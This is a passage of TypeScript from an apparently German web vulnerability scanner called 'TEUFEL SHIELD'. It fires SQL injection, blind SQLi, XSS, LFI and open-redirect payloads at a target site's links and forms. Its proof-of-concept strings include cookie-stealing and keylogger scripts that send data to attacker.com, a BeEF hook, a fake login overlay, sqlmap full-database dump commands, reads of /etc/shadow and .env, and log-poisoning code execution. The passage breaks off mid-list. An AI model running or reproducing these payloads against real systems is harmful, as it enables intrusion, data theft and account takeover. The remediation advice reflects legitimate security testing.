          if (whoisInfo.expirationDate) sendLog(`✓ Ablauf: ${whoisInfo.expirationDate}`, "WHOIS");
          if (whoisInfo.nameServers.length > 0) {
            sendLog(`✓ Nameserver: ${whoisInfo.nameServers.join(", ")}`, "WHOIS");
          }
          if (whoisInfo.country) sendLog(`✓ Land: ${whoisInfo.country}`, "WHOIS");
        }
      } catch (e) {
        sendLog("WHOIS-Abfrage fehlgeschlagen", "WHOIS");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 12: CMS DETECTION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 12, name: "CMS-Erkennung", status: "active" });
      sendLog("CMS/Framework-Erkennung wird durchgefuhrt...", "CMS");
      
      let cmsInfo: CMSInfo | null = null;
      try {
        const headersObj: Record<string, string> = {};
        Object.entries(headers).forEach(([k, v]) => { headersObj[k.toLowerCase()] = String(v); });
        cmsInfo = await detectCMS(url, body, headersObj);
        if (cmsInfo) {
          sendLog(`✓ CMS ERKANNT: ${cmsInfo.name}${cmsInfo.version ? ` v${cmsInfo.version}` : ""} (${cmsInfo.confidence}% Sicherheit)`, "CMS");
          for (const indicator of cmsInfo.indicators.slice(0, 5)) {
            sendLog(`  → ${indicator}`, "CMS");
          }
          // Add CMS-specific vulnerability
          vulnerabilities.push({
            id: randomUUID(),
            type: "information_disclosure",
            severity: "info",
            url,
            description: `CMS erkannt: ${cmsInfo.name}${cmsInfo.version ? ` Version ${cmsInfo.version}` : ""}`,
            why: "CMS-Erkennung ermoglicht gezielte Angriffe",
            solution: "CMS-Fingerprinting reduzieren, Meta-Tags entfernen",
            recommendation: "Verstecken Sie CMS-spezifische Indikatoren",
            timestamp: new Date().toISOString(),
          });
        } else {
          sendLog("Kein bekanntes CMS erkannt", "CMS");
        }
      } catch (e) {
        sendLog("CMS-Erkennung fehlgeschlagen", "CMS");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 13: SUBDOMAIN TAKEOVER CHECK
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 13, name: "Subdomain-Takeover", status: "active" });
      sendLog("Subdomain-Takeover-Prufung wird durchgefuhrt...", "TAKEOVER");
      
      const takeoverResults: SubdomainTakeoverResult[] = [];
      for (const sub of subdomains.slice(0, 10)) {
        sendLog(`Prufe ${sub.subdomain}...`, "TAKEOVER");
        const takeoverResult = await checkSubdomainTakeover(sub.subdomain);
        if (takeoverResult && takeoverResult.vulnerable) {
          takeoverResults.push(takeoverResult);
          sendLog(`⚠ TAKEOVER MOGLICH: ${takeoverResult.subdomain} -> ${takeoverResult.service}`, "TAKEOVER");
          vulnerabilities.push({
            id: randomUUID(),
            type: "subdomain_takeover",
            severity: "high",
            url: `https://${takeoverResult.subdomain}`,
            description: `Subdomain-Takeover moglich: ${takeoverResult.subdomain} zeigt auf ${takeoverResult.service}`,
            why: "Subdomain-Takeover ermoglicht Phishing und Cookie-Diebstahl",
            solution: "CNAME-Eintrag entfernen oder Dienst reaktivieren",
            evidence: `CNAME: ${takeoverResult.cname}`,
            timestamp: new Date().toISOString(),
          });
        }
      }
      if (takeoverResults.length === 0) {
        sendLog("✓ Keine Subdomain-Takeover-Schwachstellen gefunden", "TAKEOVER");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 14: CLOUD BUCKET SCANNING
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 14, name: "Cloud-Bucket-Scan", status: "active" });
      sendLog("Cloud-Buckets werden gescannt (S3, Azure, GCS)...", "CLOUD");
      
      let cloudBuckets: CloudBucketResult[] = [];
      try {
        cloudBuckets = await scanCloudBuckets(parsedUrl.hostname);
        for (const bucket of cloudBuckets) {
          if (bucket.status === "public") {
            sendLog(`⚠ OFFENTLICHER BUCKET: ${bucket.url} (${bucket.provider})`, "CLOUD");
            vulnerabilities.push({
              id: randomUUID(),
              type: "information_disclosure",
              severity: bucket.listable ? "critical" : "high",
              url: bucket.url,
              description: `Offentlicher Cloud-Bucket gefunden: ${bucket.name} (${bucket.provider})`,
              why: bucket.listable ? "Bucket-Inhalt kann aufgelistet werden!" : "Bucket ist offentlich zuganglich",
              solution: "Bucket-Zugriffsrechte einschranken",
              evidence: `Provider: ${bucket.provider}, Listbar: ${bucket.listable ? "JA" : "NEIN"}`,
              timestamp: new Date().toISOString(),
            });
          } else if (bucket.status === "exists") {
            sendLog(`✓ Bucket existiert (privat): ${bucket.name}`, "CLOUD");
          }
        }
        if (cloudBuckets.length === 0) {
          sendLog("Keine Cloud-Buckets gefunden", "CLOUD");
        }
      } catch (e) {
        sendLog("Cloud-Bucket-Scan fehlgeschlagen", "CLOUD");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 15: WEBSITE CRAWLER - COMPLETE SITE DECOMPOSITION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 15, name: "Website-Crawler", status: "active" });
      sendLog("════════════════════════════════════════════════════════════", "CRAWL");
      sendLog("WEBSITE-CRAWLER WIRD GESTARTET - KOMPLETTE DEKOMPOSITION!", "CRAWL");
      sendLog("════════════════════════════════════════════════════════════", "CRAWL");
      
      let siteStructure: SiteStructure | null = null;
      try {
        siteStructure = await crawlWebsite(url, baseUrl, 100, sendLog);
        
        // Add crawled pages to links and forms
        if (siteStructure) {
          for (const link of Array.from(siteStructure.allLinks)) {
            if (!linksFound.includes(link)) linksFound.push(link);
          }
          for (const form of siteStructure.allForms) {
            formsFound.push(`${form.method} ${form.action}`);
          }
          
          // Send structured crawl results event
          sendEvent("crawl_complete", {
            pagesCount: siteStructure.pages.length,
            linksCount: siteStructure.allLinks.size,
            formsCount: siteStructure.allForms.length,
            scriptsCount: siteStructure.allScripts.size,
            parametersCount: siteStructure.allParameters.size,
            endpointsCount: siteStructure.allEndpoints.size,
          });

          // JavaScript intelligence: endpoints, parameters, secrets, promo/shine codes
          const jsIntel = await analyzeJavaScriptIntel(Array.from(siteStructure.allScripts), baseUrl, sendLog);
          for (const file of jsIntel.jsFiles) {
            if (!jsFilesAnalyzed.includes(file)) jsFilesAnalyzed.push(file);
          }
          for (const endpoint of jsIntel.endpoints) {
            jsEndpointsDiscovered.add(endpoint);
            if (!linksFound.includes(endpoint)) linksFound.push(endpoint);
          }
          for (const param of jsIntel.parameters) jsParametersDiscovered.add(param);
          for (const signal of jsIntel.sensitiveSignals) jsSensitiveSignals.add(signal);
          for (const code of jsIntel.promoCodes) promoCodesDiscovered.add(code);
          for (const code of jsIntel.shineCodes) shineCodesDiscovered.add(code);

          // Add JS-sensitive findings to tech stack summary for report context
          if (jsSensitiveSignals.size > 0) {
            techStack["JavaScript Sensitive Signals"] = Array.from(jsSensitiveSignals).slice(0, 30);
          }
          if (promoCodesDiscovered.size > 0) {
            techStack["Promo Codes"] = Array.from(promoCodesDiscovered).slice(0, 50);
          }
          if (shineCodesDiscovered.size > 0) {
            techStack["Shine Codes"] = Array.from(shineCodesDiscovered).slice(0, 50);
          }

          sendLog(`JS-Analyse abgeschlossen: ${jsFilesAnalyzed.length} Dateien, ${jsEndpointsDiscovered.size} Endpoints, ${promoCodesDiscovered.size} Promo-Codes`, "JS");
        }
      } catch (e) {
        sendLog("Website-Crawling fehlgeschlagen", "CRAWL");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 16: VULNERABILITY TESTING
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 16, name: "Schwachstellen-Test", status: "active" });
      sendLog("════════════════════════════════════════════════════════════", "VULN");
      sendLog("SCHWACHSTELLEN-TESTS WERDEN GESTARTET - KEINE GRENZEN!", "VULN");
      sendLog("════════════════════════════════════════════════════════════", "VULN");

      // Security Headers Check
      sendLog("Sicherheits-Header werden gepruft...", "HEADERS");
      const missingHeaders: string[] = [];
      for (const header of SECURITY_HEADERS) {
        if (!headers[header.toLowerCase()]) {
          missingHeaders.push(header);
          sendLog(`✗ Fehlender Header: ${header}`, "HEADERS");
        } else {
          sendLog(`✓ Header vorhanden: ${header}`, "HEADERS");
        }
      }
      
      if (missingHeaders.length > 0) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "insecure_headers",
          severity: missingHeaders.length > 5 ? "medium" : "low",
          url,
          description: `Fehlende Sicherheits-Header: ${missingHeaders.join(", ")}`,
          why: "Fehlende Sicherheits-Header setzen die Anwendung verschiedenen Angriffen aus",
          solution: "Fugen Sie alle empfohlenen Sicherheits-Header hinzu",
          reference: "https://owasp.org/www-project-secure-headers/",
          recommendation: "Implementieren Sie alle Sicherheits-Header",
          timestamp: new Date().toISOString(),
        });
        sendLog(`⚠ ${missingHeaders.length} fehlende Sicherheits-Header!`, "VULN");
      }

      // Extract links for testing - combine initial page links with crawled links
      sendLog("Links werden fur Schwachstellen-Tests extrahiert...", "CRAWL");
      const { paramLinks, allLinks } = extractLinks(body, url);
      // Add crawled param links
      const crawledParamLinks: string[] = [];
      if (siteStructure) {
        for (const page of siteStructure.pages) {
          for (const link of page.links) {
            if (link.includes("?") || link.includes("=")) {
              crawledParamLinks.push(link);
            }
          }
        }
      }
      // Merge all param links (deduped), filter out static assets (css/js/images)
      const allParamLinks = Array.from(new Set([...paramLinks, ...crawledParamLinks]))
        .filter(link => {
          const lower = link.toLowerCase();
          return !lower.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot|map)(\?|$)/);
        });
      linksFound.push(...allParamLinks);
      sendLog(`${allParamLinks.length} testbare Links mit Parametern gefunden (${crawledParamLinks.length} aus Crawler)`, "CRAWL");

      // Also build form-based test targets
      const formTargets: { url: string; params: string[]; method: string }[] = [];
      if (siteStructure) {
        for (const form of siteStructure.allForms) {
          if (form.inputs.length > 0) {
            const params = form.inputs
              .filter(i => i.type !== 'hidden' && i.type !== 'submit' && i.type !== 'button')
              .map(i => i.name);
            if (params.length > 0) {
              formTargets.push({ url: form.action, params, method: (form.method || 'get').toLowerCase() });
            }
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // SQL INJECTION TESTING - REAL DETECTION
      // ─────────────────────────────────────────────────────────────────
      sendLog("SQL-Injection-Tests werden durchgefuhrt...", "SQLI");
      const sqlErrorPatterns = [
        "sql syntax", "mysql", "mysqli_", "pg_query", "pg_exec",
        "unterminated quoted string", "quoted string not properly terminated",
        "database error", "ora-\\d+", "ora-00", "sql error",
        "syntax error.*sql", "unclosed quotation mark",
        "odbc.*driver", "jdbc.*exception", "sqlite.*error",
        "warning: mysql", "warning: pg_", "warning: sqlite",
        "microsoft sql", "sql server.*error", "db2.*error",
        "you have an error in your sql syntax",
        "supplied argument is not a valid mysql",
        "invalid query", "sqlstate",
      ];
      
      // Test on param links — FULL PAYLOAD DEPTH
      const sqlLinksToTest = allParamLinks.slice(0, 30);
      for (const link of sqlLinksToTest) {
        sendLog(`Teste: ${link}`, "SQLI");
        let found = false;
        for (const payload of SQL_PAYLOADS.slice(0, 25)) {
          if (found) break;
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const bodyLower = (resp.body || '').toLowerCase();
            const bodySnippet = (resp.body || '').substring(0, 500);
            
            if (sqlErrorPatterns.some(err => bodyLower.match(new RegExp(err, 'i')))) {
              sendLog(`⚠ SQL-INJECTION ERKANNT: ${link}`, "SQLI");
              vulnerabilities.push(createProfessionalVuln(
                "sql_injection", "critical", link,
                `SQL INJECTION DETECTED! Database error in response — Payload: ${payload}`,
                "SQL Injection ermoglicht Zugriff auf die gesamte Datenbank, Authentifizierungs-Bypass und potenzielle Remote Code Execution. Ein Angreifer kann alle Tabellen auslesen, Benutzer-Credentials stehlen, Daten manipulieren oder uber xp_cmdshell System-Befehle ausfuhren.",
                "1. Prepared Statements verwenden\n2. ORM-Frameworks nutzen\n3. Input-Validierung mit Whitelists\n4. WAF-Regeln aktivieren\n5. Least-Privilege Datenbank-Accounts",
                "https://owasp.org/www-community/attacks/SQL_Injection",
                { payload, poc: `# TEUFEL SHIELD — SQL Injection PoC\ncurl -v '${testUrl}'\n\n# SQLMap Automated:\nsqlmap -u "${link}" --batch --dbs --tables --dump\n\n# Time-based blind:\n' AND SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n# Union extraction:\n' UNION SELECT 1,2,3,username,password FROM users--\n' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--`, evidence: `Database error detected with payload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              found = true;
            }
          } catch {}
        }
      }

      // Test on form targets — EXPANDED
      for (const form of formTargets.slice(0, 15)) {
        for (const param of form.params.slice(0, 5)) {
          for (const payload of SQL_PAYLOADS.slice(0, 15)) {
            try {
              const testUrl = `${form.url}?${param}=${encodeURIComponent(payload)}`;
              const resp = await fetchWithTimeout(testUrl, {}, 8000);
              const bodyLower = (resp.body || '').toLowerCase();
              const bodySnippet = (resp.body || '').substring(0, 500);
              if (sqlErrorPatterns.some(err => bodyLower.match(new RegExp(err, 'i')))) {
                sendLog(`⚠ SQLi IN FORMULAR: ${form.url} (${param})`, "SQLI");
                vulnerabilities.push(createProfessionalVuln(
                  "sql_injection", "critical", form.url,
                  `SQL INJECTION in Form Field '${param}' — Payload: ${payload}`,
                  "SQL Injection uber Formularfeld ermoglicht vollstandigen Datenbankzugriff",
                  "Prepared Statements verwenden, ORM nutzen, Input-Validierung",
                  "https://owasp.org/www-community/attacks/SQL_Injection",
                  { payload, poc: `# TEUFEL SHIELD — Form SQLi PoC\ncurl -v "${testUrl}"\n\nsqlmap -u "${form.url}?${param}=test" -p ${param} --batch --dbs --tables --dump`, evidence: `SQL error on field ${param}\nPayload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
                ));
                break;
              }
            } catch {}
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // BLIND SQL INJECTION - TIME-BASED DETECTION
      // ─────────────────────────────────────────────────────────────────
      sendLog("Blind SQL Injection (Time-Based) Tests...", "SQLI-BLIND");
      const blindSqlPayloads = [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND SLEEP(5)#",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "') AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
        "' OR SLEEP(5)--",
        "1) AND SLEEP(5)--",
        "' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5);--",
        "1' AND (SELECT 1 FROM pg_sleep(5))--",
      ];
      const blindTestLinks = allParamLinks.slice(0, 15);
      for (const link of blindTestLinks) {
        sendLog(`Blind SQLi: ${link}`, "SQLI-BLIND");
        for (const payload of blindSqlPayloads) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const startTime = Date.now();
            await fetchWithTimeout(testUrl, {}, 12000);
            const elapsed = Date.now() - startTime;
            // If response took 4.5+ seconds, it's likely a successful SLEEP injection
            if (elapsed >= 4500) {
              // Verify with a control request (no sleep)
              const controlStart = Date.now();
              await fetchWithTimeout(link, {}, 8000);
              const controlElapsed = Date.now() - controlStart;
              // Confirm: blind response was 3+ seconds slower than normal
              if (elapsed - controlElapsed >= 3000) {
                sendLog(`⚠ BLIND SQL INJECTION (TIME-BASED): ${link} — ${elapsed}ms vs ${controlElapsed}ms`, "SQLI-BLIND");
                vulnerabilities.push(createProfessionalVuln(
                  "sql_injection", "critical", link,
                  `BLIND SQL INJECTION (TIME-BASED) — Response delayed ${elapsed}ms (normal: ${controlElapsed}ms)`,
                  "Time-based blind SQL Injection ermöglicht vollständigen Datenbankzugriff durch Bit-für-Bit Extraktion. Ein Angreifer kann Tabellennamen, Spalten und Datensätze auslesen, auch wenn keine Fehlermeldungen angezeigt werden.",
                  "1. Prepared Statements / Parameterized Queries\n2. ORM-Framework verwenden\n3. Input-Validierung mit strenger Whitelist\n4. WAF mit Blind-SQLi-Regeln\n5. Database Activity Monitoring",
                  "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                  { payload, poc: `# TEUFEL SHIELD — Blind SQLi PoC\n# Time-based detection:\ncurl -w "\\nTime: %{time_total}s\\n" '${testUrl}'\n\n# Response time: ${elapsed}ms (normal: ${controlElapsed}ms)\n# Delay: ${elapsed - controlElapsed}ms\n\n# SQLMap automated blind extraction:\nsqlmap -u "${link}" --technique=T --time-sec=5 --batch --dbs\nsqlmap -u "${link}" --technique=T --time-sec=5 --batch -D dbname --tables\nsqlmap -u "${link}" --technique=T --time-sec=5 --batch -D dbname -T users --dump\n\n# Manual boolean-based:\n' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--`, evidence: `Time-based blind SQLi confirmed:\nInjection response: ${elapsed}ms\nNormal response: ${controlElapsed}ms\nDelta: ${elapsed - controlElapsed}ms\nPayload: ${payload}` }
                ));
                break;
              }
            }
          } catch {}
        }
      }
      // Also test POST body blind SQLi on form targets
      for (const form of formTargets.slice(0, 10)) {
        if (form.method !== "post") continue;
        for (const param of form.params.slice(0, 3)) {
          for (const payload of blindSqlPayloads.slice(0, 6)) {
            try {
              const postBody = `${param}=${encodeURIComponent(payload)}`;
              const startTime = Date.now();
              await fetchWithTimeout(form.url, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: postBody,
              }, 12000);
              const elapsed = Date.now() - startTime;
              if (elapsed >= 4500) {
                const controlStart = Date.now();
                await fetchWithTimeout(form.url, {
                  method: "POST",
                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
                  body: `${param}=test`,
                }, 8000);
                const controlElapsed = Date.now() - controlStart;
                if (elapsed - controlElapsed >= 3000) {
                  sendLog(`⚠ BLIND SQLi (POST): ${form.url} — ${param}`, "SQLI-BLIND");
                  vulnerabilities.push(createProfessionalVuln(
                    "sql_injection", "critical", form.url,
                    `BLIND SQL INJECTION (POST Time-Based) in '${param}' — ${elapsed}ms delay`,
                    "POST-basierte Blind SQL Injection über Formularfeld",
                    "Prepared Statements verwenden, Input strikt validieren",
                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                    { payload, poc: `curl -X POST -d '${postBody}' '${form.url}'`, evidence: `POST blind SQLi: ${elapsed}ms vs ${controlElapsed}ms on ${param}` }
                  ));
                  break;
                }
              }
            } catch {}
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // XSS TESTING - REAL DETECTION  
      // ─────────────────────────────────────────────────────────────────
      sendLog("XSS-Tests werden durchgefuhrt...", "XSS");
      const xssLinksToTest = allParamLinks.slice(0, 30);
      for (const link of xssLinksToTest) {
        sendLog(`Teste: ${link}`, "XSS");
        let found = false;
        for (const payload of XSS_PAYLOADS.slice(0, 25)) {
          if (found) break;
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            // Check if payload is reflected WITHOUT encoding
            if (respBody.includes(payload) && !respBody.includes(encodeURIComponent(payload).replace(/%/g, '&#'))) {
              sendLog(`⚠ XSS ERKANNT: ${link}`, "XSS");
              vulnerabilities.push(createProfessionalVuln(
                "xss", "high", link,
                `REFLECTED XSS DETECTED! Payload reflected without encoding — ${payload}`,
                "Cross-Site Scripting ermoglicht Session-Hijacking, Cookie-Diebstahl, Keylogging, Phishing und vollstandige Account-Ubernahme. Der Angreifer kann im Kontext des Opfers beliebigen JavaScript-Code ausfuhren.",
                "1. HTML-Encoding aller Ausgaben: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')\n2. Content Security Policy implementieren: script-src 'self'\n3. HttpOnly+Secure Cookie-Flags\n4. Input-Validierung\n5. DOM-Purify fur Client-Side Rendering",
                "https://owasp.org/www-community/attacks/xss/",
                { payload, poc: `# TEUFEL SHIELD — XSS PoC\ncurl -v '${testUrl}'\n\n# Cookie Stealing:\n<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n# Keylogger:\n<script>document.onkeypress=e=>fetch('https://attacker.com/log?k='+e.key)</script>\n\n# BeEF Hook:\n<script src=https://attacker.com/hook.js></script>\n\n# Phishing Overlay:\n<script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://attacker.com/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'</script>`, evidence: `XSS payload reflected in response:\nPayload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              found = true;
            }
          } catch {}
        }
      }

      // Also test search forms with XSS - these are the most common vulnerable spots
      const searchUrls = [`${baseUrl}/?s=`, `${baseUrl}/?q=`, `${baseUrl}/?search=`, `${baseUrl}/?query=`, `${baseUrl}/?keyword=`, `${baseUrl}/?term=`, `${baseUrl}/?find=`, `${baseUrl}/?text=`];
      for (const searchUrl of searchUrls) {
        for (const payload of XSS_PAYLOADS.slice(0, 15)) {
          try {
            const testUrl = `${searchUrl}${encodeURIComponent(payload)}`;
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            if (resp.status === 200 && resp.body && resp.body.includes(payload)) {
              sendLog(`⚠ XSS IN SUCHFUNKTION: ${searchUrl}`, "XSS");
              vulnerabilities.push(createProfessionalVuln(
                "xss", "high", searchUrl,
                `REFLECTED XSS in Search Function`,
                "Suchfunktion reflektiert Eingaben ohne Encoding",
                "Output-Encoding implementieren, CSP-Header setzen",
                "https://owasp.org/www-community/attacks/xss/",
                { payload, poc: `curl -v '${testUrl}'`, evidence: `Search reflects: ${payload}` }
              ));
              break;
            }
          } catch {}
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // POST BODY INJECTION TESTING (SQLi + XSS via POST)
      // ─────────────────────────────────────────────────────────────────
      sendLog("POST Body Injection Tests (SQLi + XSS)...", "POST-INJECT");
      for (const form of formTargets.slice(0, 12)) {
        if (form.method !== "post") continue;
        sendLog(`POST Inject: ${form.url}`, "POST-INJECT");
        // POST SQLi
        for (const param of form.params.slice(0, 4)) {
          for (const payload of SQL_PAYLOADS.slice(0, 10)) {
            try {
              const postBody = form.params.map(p => 
                `${p}=${p === param ? encodeURIComponent(payload) : 'test'}`
              ).join('&');
              const resp = await fetchWithTimeout(form.url, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: postBody,
              }, 8000);
              const bodyLower = (resp.body || '').toLowerCase();
              const bodySnippet = (resp.body || '').substring(0, 500);
              if (sqlErrorPatterns.some(err => bodyLower.match(new RegExp(err, 'i')))) {
                sendLog(`⚠ POST SQLi: ${form.url} (${param})`, "POST-INJECT");
                vulnerabilities.push(createProfessionalVuln(
                  "sql_injection", "critical", form.url,
                  `SQL INJECTION via POST body in '${param}'`,
                  "POST-basierte SQL Injection über Formularfeld ermöglicht Datenbankzugriff",
                  "Prepared Statements, Input-Validierung, WAF-Regeln",
                  "https://owasp.org/www-community/attacks/SQL_Injection",
                  { payload, poc: `curl -X POST -d '${postBody}' '${form.url}'`, evidence: `SQL error in POST response:\n${bodySnippet}` }
                ));
                break;
              }
            } catch {}
          }
          // POST XSS
          for (const payload of XSS_PAYLOADS.slice(0, 8)) {
            try {
              const postBody = form.params.map(p =>
                `${p}=${p === param ? encodeURIComponent(payload) : 'test'}`
              ).join('&');
              const resp = await fetchWithTimeout(form.url, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: postBody,
              }, 8000);
              const respBody = resp.body || '';
              if (respBody.includes(payload)) {
                sendLog(`⚠ POST XSS: ${form.url} (${param})`, "POST-INJECT");
                vulnerabilities.push(createProfessionalVuln(
                  "xss", "high", form.url,
                  `REFLECTED XSS via POST body in '${param}'`,
                  "POST-basierte XSS über Formularfeld",
                  "Output-Encoding, CSP-Header, Input-Validierung",
                  "https://owasp.org/www-community/attacks/xss/",
                  { payload, poc: `curl -X POST -d '${postBody}' '${form.url}'`, evidence: `XSS payload reflected in POST response` }
                ));
                break;
              }
            } catch {}
          }
        }
      }
      // POST JSON injection on API endpoints
      const apiPaths = ["/api/login", "/api/register", "/api/auth", "/api/user", "/api/search", "/api/data", "/api/query", "/api/submit"];
      for (const apiPath of apiPaths) {
        const apiUrl = `${baseUrl}${apiPath}`;
        for (const payload of SQL_PAYLOADS.slice(0, 5)) {
          try {
            const jsonBody = JSON.stringify({ username: payload, email: payload, query: payload, search: payload });
            const resp = await fetchWithTimeout(apiUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: jsonBody,
            }, 8000);
            const bodyLower = (resp.body || '').toLowerCase();
            if (sqlErrorPatterns.some(err => bodyLower.match(new RegExp(err, 'i')))) {
              sendLog(`⚠ JSON SQLi: ${apiUrl}`, "POST-INJECT");
              vulnerabilities.push(createProfessionalVuln(
                "sql_injection", "critical", apiUrl,
                `SQL INJECTION via JSON API endpoint`,
                "JSON API endpoint ist anfällig für SQL Injection",
                "Parameterized Queries, Input-Sanitization, API Gateway WAF",
                "https://owasp.org/www-community/attacks/SQL_Injection",
                { payload, poc: `curl -X POST -H 'Content-Type: application/json' -d '${jsonBody}' '${apiUrl}'`, evidence: `SQL error from JSON endpoint` }
              ));
              break;
            }
          } catch {}
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // LFI TESTING - REAL PATH TRAVERSAL
      // ─────────────────────────────────────────────────────────────────
      sendLog("LFI-Tests werden durchgefuhrt...", "LFI");
      // Test on param links with file-related parameter names
      const lfiParams = ["file", "page", "path", "include", "template", "doc", "folder", "root", "lang", "load", "read", "download", "view", "content", "cat", "dir", "action", "module", "url", "src", "source", "conf", "config", "loc", "location", "img", "image", "filename", "document", "input", "output", "data"];
      for (const link of allParamLinks.slice(0, 25)) {
        const hasLfiParam = lfiParams.some(p => link.toLowerCase().includes(p + "="));
        if (!hasLfiParam) continue;
        sendLog(`Teste LFI: ${link}`, "LFI");
        for (const payload of LFI_PAYLOADS.slice(0, 25)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            if (respBody.includes("root:") || respBody.includes("daemon:") || 
                respBody.includes("[boot loader]") || respBody.includes("[extensions]") ||
                respBody.includes("bin:") || respBody.includes("/bin/bash") ||
                respBody.match(/root:x:0:0/) || respBody.includes("www-data") ||
                respBody.includes("[mysqld]") || respBody.includes("DocumentRoot") ||
                respBody.includes("DB_PASSWORD") || respBody.includes("DB_HOST")) {
              sendLog(`⚠ LFI GEFUNDEN: ${link}`, "LFI");
              vulnerabilities.push(createProfessionalVuln(
                "lfi", "critical", link,
                `LOCAL FILE INCLUSION DETECTED! Server files readable — Payload: ${payload}`,
                "LFI ermoglicht Zugriff auf Serverdateien: /etc/passwd, /etc/shadow, Konfigurationsdateien, PHP-Sourcecode, Datenbank-Credentials, SSH-Keys und potenzielle Remote Code Execution uber Log Poisoning oder PHP-Wrapper.",
                "1. Dateipfade validieren — nur Whitelist erlauben\n2. chroot-Jail/Container verwenden\n3. open_basedir in PHP setzen\n4. Keine User-Eingaben in file_get_contents/include/require\n5. realpath() Validierung vor Dateizugriff",
                "https://owasp.org/www-project-web-security-testing-guide/",
                { payload, poc: `# TEUFEL SHIELD — LFI PoC\ncurl -v '${testUrl}'\n\n# Sensitive Dateien:\n?file=../../../../etc/passwd\n?file=../../../../etc/shadow\n?file=../../../../var/www/html/.env\n\n# PHP Wrapper RCE:\n?file=php://filter/convert.base64-encode/resource=index.php\n?file=php://input (POST body: <?php system('id'); ?>)\n?file=expect://id\n\n# Log Poisoning RCE:\n1. curl -H "User-Agent: <?php system('id'); ?>" target\n2. ?file=/var/log/apache2/access.log`, evidence: `File content leaked with payload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }
      // Direct path traversal on base URL
      for (const payload of LFI_PAYLOADS.slice(0, 15)) {
        try {
          const testUrl = `${baseUrl}/${payload}`;
          sendLog(`Teste: ${testUrl}`, "LFI");
          const resp = await fetchWithTimeout(testUrl, {}, 8000);
          const respBody = resp.body || '';
          if (respBody.includes("root:") || respBody.includes("[boot loader]") || respBody.includes("daemon:") || respBody.match(/root:x:0:0/)) {
            sendLog(`⚠ LFI GEFUNDEN: ${testUrl}`, "LFI");
            vulnerabilities.push(createProfessionalVuln(
              "lfi", "critical", testUrl,
              `LOCAL FILE INCLUSION via Path Traversal`,
              "Direkter Pfad-Traversal ermoglicht Lesen beliebiger Serverdateien",
              "Dateipfade validieren, Whitelist verwenden",
              "https://owasp.org/www-project-web-security-testing-guide/",
              { payload, poc: `curl -v '${testUrl}'`, evidence: `Path traversal successful` }
            ));
          }
        } catch {}
      }

      // ─────────────────────────────────────────────────────────────────
      // OPEN REDIRECT TESTING (ENTERPRISE-GRADE)
      // ─────────────────────────────────────────────────────────────────
      sendLog("Open-Redirect-Tests (Enterprise) werden durchgefuhrt...", "REDIRECT");
      const redirectParams = ["url", "redirect", "next", "return", "returnTo", "goto", "target", "rurl", "dest", "destination", "redir", "redirect_uri", "redirect_url", "callback", "continue", "forward", "out", "view", "ref", "link", "site", "to", "uri", "path", "return_url", "return_path", "checkout_url", "success_url", "error_url", "logout_redirect"];
      const redirectPayloads = [
        "https://evil.com", "//evil.com", "\\\\evil.com", "https://evil.com%23@trusted.com",
        "javascript:alert(1)", "//evil.com%2F%2F", "https://evil.com/.trusted.com",
        "https://trusted.com@evil.com", "https://evil.com?trusted.com", "data:text/html,<script>alert(1)</script>",
        "/\\evil.com", "/%0d%0aLocation:%20https://evil.com", "https://evil。com",
